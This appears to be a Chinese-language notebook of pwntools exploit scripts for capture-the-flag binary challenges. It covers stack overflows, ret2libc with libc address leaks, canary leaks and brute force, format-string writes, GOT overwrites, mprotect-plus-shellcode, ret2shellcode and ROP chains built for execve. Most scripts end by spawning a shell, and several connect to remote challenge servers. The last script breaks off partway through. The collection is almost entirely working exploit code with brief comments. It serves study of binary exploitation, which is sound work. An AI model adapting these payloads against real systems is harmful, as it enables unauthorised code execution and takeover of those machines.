## 异或16进制数组得flag

```python
enc_flag = [0x56, 0x05, 0x53, 0x52, 0x04, 0x03, 0x53, 0x54, 0x04, 0x0B, 0x53, 0x51, 0x06, 0x06, 0x0F, 0x55, 0x05, 0x5B, 0x03, 0x56, 0x0E, 0x07, 0x57, 0x0E, 0x01, 0x0D, 0x56, 0x00, 0x04, 0x06, 0x0A, 0x5D, 0x00, 0x00, 0x12, 0x54, 0x33, 0x0C, 0x0A]
enc = '5c715207e3abed7dfb7c8ea9c82d0e29'
flag = ''
for i in range(0, len(enc)):
    flag += chr(ord(enc[i])^enc_flag[i])
print(flag)
```

## 存在后门函数exp

```python
#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(arch = 'i386', os = 'linux', timeout = 1)    #初始化上下文环境，主要是系统、架构和读取超时时间

#io = remote('172.17.0.2', 10001)    #此处的IP地址和端口需要根据目标修改
io = process("./doubly_dangerous")

get_flag_addr = 0x0804857b    #程序中give_flag函数的代码地址

payload = ''                    
payload += 'A'*80                #使用80个任意字符填充
payload += p64(get_flag_addr)    #将EIP劫持到get_flag_addr

print io.recv()                        #读取程序的输出
io.sendline(payload)            #向程序输入payload，注意使用sendline()或者send()的数据末尾加上回车'\n'
print io.recv()        
```

## ret2libc_32

```python
from pwn import *

r = process("./ret2libc1")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']
bin_sh_offset = next(libc.search("/bin/sh"))

r.recvline()
puts_addr = eval(r.recvline()[:-1])

system_addr = (puts_addr - puts_offset) + system_offset
bin_sh_addr = (puts_addr - puts_offset) + bin_sh_offset
pop_rdi = 0x0000000000400813

print("system_addr: " + hex(system_addr))

payload = "a"*0x28 + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
r.sendline(payload)

r.interactive()

```

## 输入指定内容payload

```python
from pwn import*

io = remote("183.129.189.60",10032)

#io.recvuntil('Waiting....')

payload = 'Give' + 96 * 'a' + '!'
io.sendline(payload)

print io.recv()

io.interactive()
```

## strcpy溢出

```python
#coding:utf-8
from pwn import*

# sh = process('./1')
sh = remote('220.249.52.133', 53400)

back_door = 0x0804868B

payload = '1'
sh.sendlineafter('choice:', payload)
sh.sendlineafter('username:', payload)

# 密码长度3~8判断通过al寄存器，1个字节，所以通过1 00000100
# 控制低位在3~8范围内即可
# 最终strcpy的溢出范围位0x14
payload = 0x14 * 'a' + 0x4 * 'b' + p32(back_door)
payload += (0x104 - len(payload)) * 'c'
sh.sendafter('passwd:', payload)

sh.interactive()
```

## 输入指定16进制内容溢出

```python
from pwn import*

io = remote("183.129.189.60",10033)
# io = process('./2.bin')

#io.recvuntil('Waiting....')
print io.recv()
payload = '\x1d\x37\x2b\x3a\x35\x11\x2d\x31\x38\x3e' + 't_of_Happiness' 

# pause()
# io.sendline(payload)
io.send(payload)
# pause()
# print io.recv()

io.interactive()
```

## 格式化字符串漏洞修改bss段值

```python
#coding:utf-8
from pwn import*

# sh = process('./3')
sh = remote('220.249.52.133', 53176)

print(sh.recv())
sh.send('fzuim')
print(sh.recv())

bss_data = 0x0804A068

# sh.recvuntil('leave your message please:')
payload = p32(bss_data) + 0x4 * 'a' + '%10$n'
sh.sendline(payload)

print(sh.recv())

sh.interactive()


```

## ret2text_64输入bin/sh执行后门函数

```python
from pwn import *

r = process("./ret2text_64")
#r = remote("49.235.141.207",10003)
print pidof(r)

r.recvuntil("Enter your name:")

r.sendline("/bin/sh\x00")

r.recvuntil("give me a string(less 50):")

payload = 'a'*0x40+'b'*8+p64(0x400833)+p64(0x601090)+p64(0x400720)


#pause()
r.sendline(payload)

r.interactive()

```

## canary绕过-格式化字符串漏洞打印出canary值进行覆盖溢出后门函数

```python
#coding:utf-8
from pwn import*

context.log_level = 'debug'

elf = ELF('./bin')
sh = process('./bin')

backdoor_addr = 0x0804863B

sh.sendline('%7$p')

# 32位泄露canary值0x12345678 刚好10个字符,转成16进制值
canary = int(sh.recv(10), 16)
print(hex(canary))

# 覆盖总和=0x70+0x4
payload = (0x70 - 0xC) * 'a' + p32(canary) + 0x8 * 'a' + 0x4 * 'b' + p32(backdoor_addr)
sh.sendline(payload)

sh.interactive()
```

## canary绕过-爆破

```python
#coding:utf-8
from pwn import*

# context.log_level = 'debug'

sh = process('./bin1')

back_addr = 0x0804863B

sh.recvuntil('welcome\n')
canary = '\x00'
for i in range(3):
    for i in range(256):
        sh.send((0x70-0xC)*'a' + canary + chr(i))
        a = sh.recvuntil("welcome\n")
        if "recv" in a:
            canary += chr(i)
            break

payload = (0x70-0xC) * 'a' + p32(canary) + 0x8 * 'a' + 0x4 * 'b' + p32(back_addr)
sh.sendline(payload)

sh.interactive()
```

## 输入bin/sh溢出执行

```python
#coding:utf-8
from pwn import*

proc_name = './53c24fc5522e4a8ea2d9ad0577196b2f'
elf = ELF(proc_name)
sh = process(proc_name)

name_addr = 0x0804A080

sh.recvuntil('please tell me your name')
sh.sendline('/bin/sh\0')

payload = 0x26 * 'a' + 0x4 * 'b' + p32(elf.plt['system']) + p32(1) + p32(name_addr)
sh.sendafter('hello,you can leave some message here:', payload)

sh.interactive()
```

## 64泄露puts_got表，溢出执行system('/bin/sh')

```python
#coding:utf-8

from pwn import *

context.log_level = 'debug'
# ubuntu18得环境很迷。。。本地可成功getshell远程不行。。。

# r = process('./ciscn_2019_c_1')
elf = ELF('./ciscn_2019_c_1')
libc = ELF('./libc-2.27.so')
r = remote('node3.buuoj.cn', 27296)

print(r.recv())

puts_plt_addr = elf.plt['puts']# 0x04006E0
puts_got_addr = elf.got['puts']# 0x0602020
main_func_addr = 0x0400B28
enc_func_addr = 0x04009A0

pop_rdi_addr = 0x0400c83

# r.sendlineafter('choice!\n', '1')
r.sendline('1')
print(r.recv())

#print('payload~~~~')
#payload = 49 * 'a' + '\0' + 31 * 'a' + 0x8 * 'b'
payload = 0x50 * 'a' + 0x8 * 'b'
payload += p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(enc_func_addr)

# print('break...')
# pause()

r.sendline(payload)

r.recvuntil('@') # 为什么是@ 只能是动态调试才发现。。。
print(r.recvline()) # 这边有个坑，@后还接了个换行

puts_addr = u64(r.recv(6).ljust(8,"\x00"))
print(hex(puts_addr))

puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']
binsh_offset = libc.search('/bin/sh\0').next()

# puts_offset = 0x06f6a0
# binsh_offset = 0x18ce17
# system_offset = 0x0453a0

base_addr = puts_addr - puts_offset
binsh_addr = base_addr + binsh_offset
system_addr = base_addr + system_offset

payload = 0x50 * 'a' + 0x8 * 'b'
payload += p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr)

#r.sendlineafter('choice!\n', '1')
print(r.recv())
r.sendline(payload)

r.interactive()

```

## 64泄露puts_got表，加上了脚本爆破栈平衡概念

```python
#coding:utf-8

from pwn import *
from LibcSearcher import *

def encrypt(string):
    newstr = list(string)
    for i in range(len(newstr)):
        c = ord(string[i])
        if c <= 96 or c > 122:
            if c <= 64 or c > 90:
                if c > 47 and c <= 57:
                    c ^= 0xF
            else:
               c ^= 0xE
        else:
            c ^= 0xD
        newstr[i] = chr(c)
    return ''.join(newstr)
#p = remote('node3.buuoj.cn',29403)
p = process('./ciscn_2019_c_1')
elf = ELF('./ciscn_2019_c_1')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x0000000000400C83 #一个万能的gadget，x64程序基本都存在，pop rdi;ret;
#start_addr = 0x0000000000400790
main_addr = 0x000000000400B28 #主函数地址
p.recv()
p.sendline('1')
p.recvuntil('encrypted\n')
#泄露puts实际地址
payload = '1'*0x58+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
p.sendline(encrypt(payload))

#print encrypt(payload)

p.recvuntil('Ciphertext\n')
p.recvuntil('\n')
#接受puts的实际地址
addr = u64(p.recvuntil('\n', drop=True).ljust(8,'\x00'))

#print "addr=", hex(addr)
#此处搜寻到的libc是本机的libc-2.23.so,需要自行添加到database，
#具体方法可上github，搜寻libc_database项目

libc = LibcSearcher("puts", addr)
libcbase = addr - libc.dump('puts')
# libcbase = addr - 0x06f6a0

print 'str_bin_sh=',hex(libcbase + libc.dump('str_bin_sh'))
#print libc.dump('system')

p.recv()
p.sendline('1')
p.recvuntil('encrypted\n')
sys_addr = libcbase + 0x0453a0
bin_sh = libcbase + 0x18ce17
#下面为正常脚本，可以在kali中拿到shell，如果是Ubuntu18，需要在里面加ret进行栈对齐
payload = '1'*0x58+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)
ret = 0x4006b9
payload_Ubuntu18 = '1'*0x58+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)
p.sendline(payload)
p.interactive()
```

## 64泄露puts got表

```python
#coding:utf-8

from pwn import *

context.log_level = 'debug'

# r = remote('node3.buuoj.cn', 29971)
r = process('./ciscn_2019_en_2')
elf = ELF('./ciscn_2019_en_2')

puts_plt_addr   = elf.plt['puts']
puts_got_addr   = elf.got['puts']
main_func_addr  = 0x0400B28
pop_rdi_addr    = 0x0400c83

r.sendlineafter('choice!', '1')

payload = 0x50 * 'a' + 0x8 * 'b'
payload += p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(main_func_addr)

r.sendlineafter('Input your Plaintext to be encrypted', payload)

r.recvuntil('@') # 为什么是@ 只能是动态调试才发现。。。
print(r.recvline()) # 这边有个坑，@后还接了个换行

puts_addr = u64(r.recv(6).ljust(8,"\x00"))
print('puts_addr:%s' % (hex(puts_addr)))

# puts_offset = libc.symbols['puts']
# system_offset = libc.symbols['system']
# binsh_offset = libc.search('/bin/sh\0').next()

puts_offset = 0x06f6a0
binsh_offset = 0x18ce17
system_offset = 0x0453a0

base_addr = puts_addr - puts_offset
binsh_addr = base_addr + binsh_offset
system_addr = base_addr + system_offset

payload = 0x50 * 'a' + 0x8 * 'b'
payload += p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr) + p64(main_func_addr)

r.sendline('1')
r.sendline(payload)

r.interactive()

```

## mprotect利用

```python
#coding:utf-8
from pwn import*

context.log_level = 'debug'
context(arch='i386', os='linux')

local = 0
proc_name = './get_started_3dsctf_2016'
elf = ELF(proc_name)

# 这道题本地和远程两种解法，真的干。。。
if local:
    sh = process(proc_name)
    a1 = 0x308CD64F
    a2 = 0x195719D1
    getflag_addr = 0x080489A0
    main_addr = 0x08048A20

    payload = 0x38 * 'a' # 这边不用覆盖ebp,在于get_flag并没有push ebp
    payload += p32(getflag_addr) + p32(main_addr)
    payload += p32(a1) + p32(a2)
    sh.sendline(payload)
else:
    # sh = remote('node3.buuoj.cn', 28308)
    sh = process(proc_name)
    mprotect_addr = elf.symbols['mprotect']
    read_addr = elf.symbols['read']
    pop3_edi_esi_ebx_ret = 0x08063adb
    mem_addr = 0x080EB000 #.got.plt 的起始地址
    mem_size = 0x1000
    mem_type = 0x7 # 可执行权限

    payload = 0x38 * 'a'
    payload += p32(mprotect_addr)
    payload += p32(pop3_edi_esi_ebx_ret)
    payload += p32(mem_addr) + p32(mem_size) + p32(mem_type)
    payload += p32(read_addr)
    payload += p32(pop3_edi_esi_ebx_ret)
    payload += p32(0) + p32(mem_addr) + p32(0x100)
    payload += p32(mem_addr)    #将read函数的返回地址设置到我们修改的内存的地址，之后我们要往里面写入shellcode
    sh.sendline(payload)
    # read写入shellcode
    payload = asm(shellcraft.sh())
    sh.sendline(payload)

sh.interactive()
```

## ret2shellcode 题目直接输入栈地址，并且read写入该地址

```python
#coding:utf-8
from pwn import*

context.log_level = 'debug'
context(arch='i386', os='linux')

sh = process('./level1')

sh.recvuntil("What's this:0x")

buff_addr = int(sh.recv(8), 16)
print('buff_addr:%x' % (buff_addr))

shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(0x88, 'a') + 0x4 * 'b' + p32(buff_addr)

sh.sendline(payload)

sh.interactive()
```

## system执行了，则可以直接调用got表地址，不用再算libc的地址

```python
#coding:utf-8
from pwn import*

sh = process('./level2')
elf = ELF('./level2')

sh.recvuntil('Input:')

main_addr = 0x08048480
# binsh_addr = 0x0804A024
# system_addr = 0x08048320

system_addr = elf.plt['system']
binsh_addr = elf.search('/bin/sh\0').next()

#p32(main_addr)也可以覆盖p32(0)，主要是执行了system会启动一个新进程，所以不用覆盖有效地址
payload = 0x88 * 'a' + 0x4 * 'b' + p32(system_addr) + p32(main_addr) + p32(binsh_addr)

sh.sendline(payload)

sh.interactive()
---------------------------------------------------------------------------------------------------------------
#coding:utf-8
from pwn import*

# sh = process('./level2')
sh = remote('node3.buuoj.cn', 29229)
elf = ELF('./level2')

# 直接调用system的plt
system_addr = elf.plt['system']
binsh_addr = 0x0804A024

payload = 0x88 * 'a' + 0x4 * 'b' + p32(system_addr) + p32(1) + p32(binsh_addr)

sh.sendline(payload)

sh.interactive()
```

## 64位调用system plt/got

```python
#coding:utf-8
from pwn import*

sh = process('./level2_x64')
elf = ELF('./level2_x64')

sh.recvuntil('Input:')

system_addr = elf.plt['system']
binsh_addr = elf.search('/bin/sh\0').next()
pop_rdi_ret_addr = 0x04006b3

payload = 0x80 * 'a' + 0x8 * 'b' + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)

sh.sendline(payload)

sh.interactive()
```

## elf调用symbols?有点疑问，不应该是libc调symbols算偏移?好像是elf有bin/sh字符串和system函数才可以

```python
#coding: utf-8
from pwn import *

r = process("./level2_x64")
#r = remote("pwn2.jarvisoj.com", 9882)
print pidof(r)

elf = ELF('./level2_x64')

r.recv()

#system_addr = 0x40063e
system_addr = elf.symbols['system']    # 64 位下使用这两个都行


payload = 'a'*136 + p64(0x00000000004006b3) + p64(next(elf.search("/bin/sh"))) + p64(system_addr)

pause()

r.send(payload)

r.interactive()

```

## 32泄露write的got表，偏移地址网上找

```python
#coding:utf-8
from pwn import*

context.log_level = 'debug'

sh = process('./level3')
elf = ELF('./level3')

main_addr = 0x08048484

sh.recvuntil('Input:\n')

payload = 0x88 * 'a' + 0x4 * 'b'
payload += p32(elf.plt['write']) + p32(main_addr) + p32(1) + p32(elf.got['write']) + p32(4)
sh.sendline(payload)

write_addr = u32(sh.recv(4))
write_offset = 0x0d5c70
binsh_offset = 0x15bb0b
system_offset = 0x03adb0
libcbase = write_addr - write_offset
binsh_addr = libcbase + binsh_offset
system_addr = libcbase + system_offset

sh.recvuntil('Input:\n')

payload = 0x88 * 'a' + 0x4 * 'b' + p32(system_addr) + p32(main_addr) + p32(binsh_addr)
sh.sendline(payload)

sh.interactive()
-----------------------------------------------------------------------------------------------------
#coding:utf-8
from pwn import*

context.log_level = 'debug'

proc_name = './level3'

# sh = process(proc_name)
sh = remote('220.249.52.133', 31577)
elf = ELF(proc_name)
libc = ELF('./libc_32.so.6')

write_plt_addr = elf.plt['write']
write_got_addr = elf.got['write']
main_addr = 0x08048484

payload = 0x88 * 'a' + 0x4 * 'b'
payload += p32(write_plt_addr) + p32(main_addr)
payload += p32(1) + p32(write_got_addr) + p32(4)

sh.sendafter('Input:\n', payload)

write_addr = u32(sh.recv(4))
print('write_addr:%s' % (hex(write_addr)))

# write_offset = 0x0d5c70
# system_offset = 0x03adb0
# binsh_offset = 0x15bb0b
write_offset = libc.symbols['write']
system_offset = libc.symbols['system']
binsh_offset = libc.search('/bin/sh\0').next()

libc_base = write_addr - write_offset
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset

print('system[%s],binsh[%s]' % (hex(system_addr), hex(binsh_addr)))

payload = 0x88 * 'a' + 0x4 * 'b'
payload += p32(system_addr) + p32(main_addr) + p32(binsh_addr)

sh.sendafter('Input:\n', payload)

sh.interactive()
```

## 64泄露write的got表地址

```python
#coding:utf-8
from pwn import*

context.log_level = 'debug'

sh = process('./level3_x64')
elf = ELF('./level3_x64')

main_addr = 0x040061A
pop_rdi_ret_addr = 0x04006b3
pop_rsi_r15_ret_addr = 0x04006b1

sh.recvuntil('Input:\n')

payload = 0x80 * 'a' + 0x8 * 'b'
payload += p64(pop_rdi_ret_addr) + p64(1) 
payload += p64(pop_rsi_r15_ret_addr) + p64(elf.got['write']) + p64(8) + p64(elf.plt['write']) + p64(main_addr)
sh.sendline(payload)

write_addr = u64(sh.recv(6).ljust(8,"\x00"))
print(hex(write_addr))

write_offset = 0x0f7370
binsh_offset = 0x18ce17
system_offset = 0x0453a0
libcbase = write_addr - write_offset
binsh_addr = libcbase + binsh_offset
system_addr = libcbase + system_offset

sh.recvuntil('Input:\n')

payload = 0x80 * 'a' + 0x8 * 'b' + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr) + p64(main_addr)
sh.sendline(payload)

sh.interactive()
-------------------------------------------------------------------
from pwn import*
#context.log_level="debug"

r = process('./babyrop64')

writegot_addr = 0x0000000000601018
writeplt_addr = 0x0000000000400430
poprdi_addr = 0x0000000000400623
poprsi_popr15_ret_addr = 0x0000000000400621
main_addr = 0x0000000000400587

payload = 0x88 * 'a'
payload += p64(poprdi_addr) + p64(1) 
payload += p64(poprsi_addr) + p64(writegot_addr) +  8 * 'b' #8b is popdsi addres=pop rsi pop r15 ret
payload += p64(writeplt_addr)
payload += p64(main_addr)

r.recv()
r.sendline(payload)

addr_tmp = r.recv(6).ljust(8, '\x00')
write_addr = u64(addr_tmp)
#print addr_tmp
#print write_addr
#print p64(write_addr)

write_offset = 0x0f72b0
system_offset = 0x045390
binsh_offset = 0x18cd57 

libc_addr = write_addr - write_offset
print hex(libc_addr)

system_addr = libc_addr + system_offset
binsh_addr = libc_addr + binsh_offset
print hex(system_addr)
print hex(binsh_addr)

payload = 0x88 * 'a' + p64(poprdi_addr) + p64(binsh_addr) + p64(system_addr)

r.recv()

print '--------------inject pause------------'
pause()
r.sendline(payload) 
pause()


r.interactive()


```

## 溢出修改__stack_chk_fail的got

```python
#coding:utf-8
from pwn import *

r = process('./Memory_Monster_I')
elf = ELF('./Memory_Monster_I')

back_addr = 0x040124A

payload = p64(elf.got['__stack_chk_fail'])
payload = payload.ljust(0x38, 'a')# 构造栈溢出，进入__stack_chk_fail函数
r.sendafter('addr:', payload)

# 程序会将输入内容进行*buf，将内存进行写入，所以通过修改got的地址，plt跳转到后门函数
payload = p64(back_addr)
r.sendafter('data:', payload)

r.interactive()


```

## 32没有后台函数泄露puts_got表，ret2libc

```python
from pwn import*

context.log_level = 'debug'
r = process('./no_system_32')

print '1:'+ r.recv()

putsgot_addr = 0x0804A014
putsplt_addr = 0x080483A0
main_addr = 0x080484F0

payload = 0x20* 'a'
payload += p32(putsplt_addr) +p32(main_addr) + p32(putsgot_addr)

r.sendline(payload)
pause()
#print '2:'+ r.recv()
#print '--------------------------------------'
pause()
puts_offset = 0x05fca0
puts_addr = u32(r.recv(4))
print hex(puts_addr)
libc_addr = puts_addr - puts_offset
print(hex(libc_addr))
print(libc_addr)

pause()

r.recvuntil('Hello!')

system_addr = libc_addr + 0x03ada0
binsh_addr = libc_addr + 0x15ba0b

payload = 0x20*'a' + p32(system_addr) + p32(main_addr) + p32(binsh_addr)


#pause()
r.sendline(payload)
#pause()

#print r.recv()

r.interactive()
-----------------------------
from pwn import *


elf = ELF('./no_system_32')
LOCAL = 1
if LOCAL:
    r = process("./no_system_32")
    libc = ELF("/lib/i386-linux-gnu/libc.so.6")
else:
    r = remote("49.235.141.207",10007)
    libc = ELF("libc-2.23_32.so")

#r.recv()

main_addr = 0x080484f0


payload = 'a'*32 + p32(elf.plt['puts'])+p32(main_addr) + p32(elf.got['puts'])
r.send(payload)

#raw_input()

r.recvline()

libc_addr = u32(r.recv(4))-libc.symbols['puts']

success("libc_addr: " + hex(libc_addr))

r.recvuntil("Hello!")

one_gadget = libc_addr + 0x3fd27
system_addr = libc_addr + libc.symbols['system']
bin_sh_addr = libc_addr + next(libc.search("/bin/sh"))

payload2 = 'a'*32 + p32(system_addr) + p32(main_addr) + p32(bin_sh_addr)

r.send(payload2)

r.interactive()


```

## 64没有后台函数泄露puts_got表，ret2libc

```python
from pwn import*

context.log_level='debug'

r = process('./no_system_64')
print r.recv()

main_addr = 0x0000000000400662
putsplt_addr = 0x0000000000400500
putsgot_addr = 0x0000000000601018
poprdi_addr = 0x0000000000400723

payload = 0x28*'a'
payload += p64(poprdi_addr) + p64(putsgot_addr) + p64(putsplt_addr) + p64(main_addr)

r.sendline(payload)

puts_offset = 0x06f690
puts_addr = u64(r.recv(6).ljust(8,'\x00'))
print hex(puts_addr)

libc_addr = puts_addr - puts_offset

system_addr = libc_addr + 0x045390
binsh_addr = libc_addr + 0x18cd57

payload = 0x28*'a' + p64(poprdi_addr) + p64(binsh_addr) + p64(system_addr)

r.sendline(payload)


r.interactive()

```

## 泄露write的got表地址

```python
#coding:utf-8

from pwn import *
context.log_level = 'debug'

r = remote('node3.buuoj.cn', 26197)
# r = process('./pwn')
# elf = ELF('./pwn')

payload = '\0' * 7 + p32(0xff) #\0 跳过strncmp的判断，255替换read长度

r.sendline(payload)
print(r.recvline())
#到这里走到了栈溢出的read流程
write_plt_addr = 0x08048578
write_got_addr = 0x08049FEC
main_addr = 0x08048825

payload = 0xe7 * 'a' + 0x4 * 'b' + p32(write_plt_addr) + p32(main_addr) + p32(1) + p32(write_got_addr) + p32(4)
r.sendline(payload)

#获取write的地址
write_addr = u32(r.recv(4))
print(hex(write_addr))

# write_offset = 0x0d9c70
# binsh_offset = 0x15f803
# system_offset = 0x03b340

write_offset = 0x0d5c70
binsh_offset = 0x15bb0b
system_offset = 0x03adb0
libc_addr = write_addr - write_offset

binsh_addr = libc_addr + binsh_offset
system_addr = libc_addr + system_offset

# 再来一遍
print('~~~~~~~once more~~~~~~~~~')
payload = '\0' * 7 + p32(0xff) #\0 跳过strncmp的判断，255替换read长度
r.sendline(payload)
print(r.recvline())

payload = 0xe7 * 'a' + 0x4 * 'b' + p32(system_addr) + p32(main_addr) + p32(binsh_addr)
pause()
r.sendline(payload)

r.interactive()
```

## 格式化字符串漏洞，修改指定地址值绕过判断

```python
#coding:utf-8
from pwn import*
context.log_level = 'debug'
context(arch='i386', os='linux')

r = process('./pwn5')
# r = remote('node3.buuoj.cn', 27966)

r.recvuntil('your name:')

payload = p32(0x804c044) + '%10$n'

pause()
r.sendline(payload)

r.recvuntil('your passwd:')
r.sendline('4')

r.interactive()
```

## 格式化字符串漏洞利用

```python
#coding:utf-8
from pwn import*

sh = process('./pwn_me_2')

payload = 0x10 * 'a' + '%llx'

sh.sendafter('name:', payload)
sh.recvunitl('preparing......\n')

src_addr = int(sh.recv(12), 16)
print(hex(src_addr))

target_addr = src_addr + 0x60;

payload = p64(target_addr) + '%$x'

sh.interactive()
```

## strncmp绕过

```python
#coding:utf-8

from pwn import *
from LibcSearcher import *

context(arch = 'i386', os = 'linux')
context.log_level = 'debug'

r = remote('node3.buuoj.cn', 26812)
# r = process('./pwn')
elf = ELF('./pwn')
# libc = ELF('./libc-2.23.so')

payload = '\0' * 7 + p32(0xff) #\0 跳过strncmp的判断，255替换read长度

r.sendline(payload)
print(r.recvline()) #打印出Correct\n

#到这里走到了栈溢出的read流程
# write_plt_addr = 0x08048578
# write_got_addr = 0x08049FEC
main_addr = 0x08048825

payload = 0xe7 * 'a' + 0x4 * 'b' + p32(elf.plt['write']) + p32(main_addr) + p32(1) + p32(elf.got['write']) + p32(4)
r.sendline(payload)

#获取write的地址
write_addr = u32(r.recv(4))
print('write_addr:%s' % (hex(write_addr)))

# libc = LibcSearcher("write", write_addr)
# libcbase = write_addr - libc.dump('write')
# binsh_addr = libcbase + libc.dump('str_bin_sh')
# system_addr = libcbase + libc.dump('system')

# # write_offset = 0x0d9c70
# # binsh_offset = 0x15f803
# # system_offset = 0x03b340

write_offset = 0x0d5c70
binsh_offset = 0x15bb0b
system_offset = 0x03adb0

# # write_offset = 0x0d5c70
# # binsh_offset = 0x15ba3f
# # system_offset = 0x03ad80

libc_addr = write_addr - write_offset
binsh_addr = libc_addr + binsh_offset
system_addr = libc_addr + system_offset

# 再来一遍
print('~~~~~~~once more~~~~~~~~~')
payload = '\0' * 7 + p32(0xff) #\0 跳过strncmp的判断，255替换read长度
r.sendline(payload)
print(r.recvline())

crash_bug = p32(0x08048898)
payload = 0xe7 * 'a' + 0x4 * 'b' + crash_bug + p32(system_addr) + p32(main_addr) + p32(binsh_addr)
r.sendline(payload)

r.interactive()
```

## 汇编cmp漏洞绕过

```python
#coding:utf-8
from pwn import*

# sh = process('./r2t3')
sh = remote('node3.buuoj.cn', 26861)

backdoor_addr = 0x0804858B

# 不算int溢出，主要在于cmp采用al寄存器一个字节，int 4字节，可以控制第一字节来进行绕过
payload = 0x11 * 'a' + 0x4 * 'b' + p32(backdoor_addr)
payload+= (0x104 - len(payload)) * 'c'

sh.sendafter('name:', payload)

sh.interactive()
```

## ret2shell

```python
from pwn import*

context.arch="amd64"

r = process('./ret2sc')

#从addr后开始接受
r.recvuntil("buf addr: ")

buf_addr = eval(r.recv(14)) #字符串类型地址转整数



# payload = shellcode -> 0x78
# context.arch="amd64"  shellcraft.amd64.sh()
# shellcraft.i386.sh()
sc_len = len(asm(shellcraft.amd64.sh()))
payload = asm(shellcraft.amd64.sh()) + 'a' * (0x78 - sc_len)

#pop rax ; ret ; call rax
#payload += p64(0x000000000046ba08)+p64(buf_addr) +p64(0x0000000000401011)#覆盖返回地址
payload += p64(buf_addr)
r.sendline(payload)

r.interactive()
```

## ret2shell 自动构造rop链 call rax

```python
from pwn import *


#r = process("./ret2sc")
r = remote("106.54.129.202",10009)

print pidof(r)

r.recvuntil("buf addr: ")
esp_addr = eval(r.recv(14))

offset = 'a'*120

shellcode = "\x48\x31\xc9\x48\xf7\xe1\x04\x3b\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"

pop_rax_ret = 0x000000000046ba08
call_rax = 0x0000000000496d17

payload = shellcode.ljust(120,'\x61') + p64(pop_rax_ret) + p64(esp_addr) + p64(call_rax)

r.recvuntil("shellcode for me:")

#pause()

r.sendline(payload)

r.interactive()

```

## ret2syscall

```python
#coding:utf-8
from pwn import*
from struct import pack

sh = process('./ret2syscall')

binsh_addr = 0x080bb548
int80_addr = 0x0806ca25
pop_eax_ret = 0x080b8316
pop_edx_ecx_ebx_ret = 0x0806edd0

# payload = flat(['a' * 0x2C, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh_addr, int80_addr])

payload = 0x28 * 'a' + 0x4 * 'b' # 32位execve函数中断号是11，64位中断号59
# payload += p32(pop_eax_ret) + p32(0xb)
# payload += p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) # 从右往左压栈
# payload += p32(binsh_addr)
# payload += p32(int80_addr)

p = ''
p += pack('<I', 0x0806edaa) # pop edx; ret
p += pack('<I', 0x080ea060) # @.data
p += pack('<I', 0x080b8316) # pop eax; ret
p += '/bin'
p += pack('<I', 0x080547db) # mov dword ptr[edx], eax; ret
p += pack('<I', 0x0806edaa) # pop edx; ret
p += pack('<I', 0x080ea064) # @.data + 4
p += pack('<I', 0x080b8316) # pop eax; ret
p += '//sh'
p += pack('<I', 0x080547db) # mov dword ptr[edx], eax; ret
p += pack('<I', 0x0806edaa) # pop edx; ret
p += pack('<I', 0x080ea068) # @.data + 8
p += pack('<I', 0x08049403) # xor eax, eax; ret
p += pack('<I', 0x080547db) # mov dword ptr[edx], eax; ret
p += pack('<I', 0x080481c9) # pop ebx; ret
p += pack('<I', 0x080ea060) # @.data
p += pack('<I', 0x080debc9) # pop ecx; ret
p += pack('<I', 0x080ea068) # @.data + 8
p += pack('<I', 0x0806edaa) # pop edx; ret
p += pack('<I', 0x080ea068) # @.data + 8
p += pack('<I', 0x08049403) # xor eax, eax; ret
p += pack('<I', 0x0807a78f) # inc eax; ret
p += pack('<I', 0x0807a78f) # inc eax; ret
p += pack('<I', 0x0807a78f) # inc eax; ret
p += pack('<I', 0x0807a78f) # inc eax; ret
p += pack('<I', 0x0807a78f) # inc eax; ret
p += pack('<I', 0x0807a78f) # inc eax; ret
p += pack('<I', 0x0807a78f) # inc eax; ret
p += pack('<I', 0x0807a78f) # inc eax; ret
p += pack('<I', 0x0807a78f) # inc eax; ret
p += pack('<I', 0x0807a78f) # inc eax; ret
p += pack('<I', 0x0807a78f) # inc eax; ret
p += pack('<I', 0x0806ca25) # int 0x80

payload += p

sh.sendline(payload)

sh.interactive()
```

## 绕过canary，自己构造rop链read-write出flag

```python
#coding:utf-8
from pwn import*

context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']

# sh = process('./pwn')
sh = remote('node1.dasctf.com', 11003)

elf = ELF('./pwn')
libc = ELF('./libc.so.6')

puts_offset = libc.symbols['puts']

pop_rdi_ret_addr = 0x0400943
pop_rsi_r15_ret_addr = 0x0400941
func_addr = 0x400726

# canary绕过
sh.sendafter('?', '%27$p')
sh.recvuntil('0x')
canary = int(sh.recv(16), 16)
print('canary = '+hex(canary))

padding = (0x70 - 0x8) * 'a' + p64(canary) + 0x8 * 'b'
payload = padding + p64(pop_rdi_ret_addr) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(func_addr)

sh.sendafter('?', payload)

puts_addr = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
# puts_addr = u64(sh.recv(6).ljust(8,"\x00"))
print('puts_addr:'+hex(puts_addr))

libc_addr = puts_addr - puts_offset
print('libc_addr:'+hex(libc_addr))

# 保证lib.sym函数正确偏移
libc.address = libc_addr
bss_addr = elf.bss()
pop_rdx_rsi_ret_addr = libc_addr + 0x115189

# sh.sendafter('Welcome! What is your name?\n', '%27$p')
# sh.recvuntil('0x')
